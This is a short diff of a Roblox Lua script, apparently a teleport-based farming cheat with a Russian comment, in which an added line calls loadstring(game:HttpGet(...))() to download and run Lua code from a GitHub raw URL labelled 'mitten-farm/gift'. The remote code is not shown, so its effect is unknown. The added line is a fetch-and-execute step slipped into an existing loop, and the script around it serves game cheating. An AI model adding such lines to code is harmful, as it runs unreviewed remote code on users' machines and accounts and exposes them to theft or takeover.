@@ -14,5 +14,5 @@ game:GetService("RunService").RenderStepped:wait()
 -- Телепортация обратно на исходную позицию
 player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
 wait(1)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KykyryzoB/mitten-farm/main/gift/lua"))()
 end
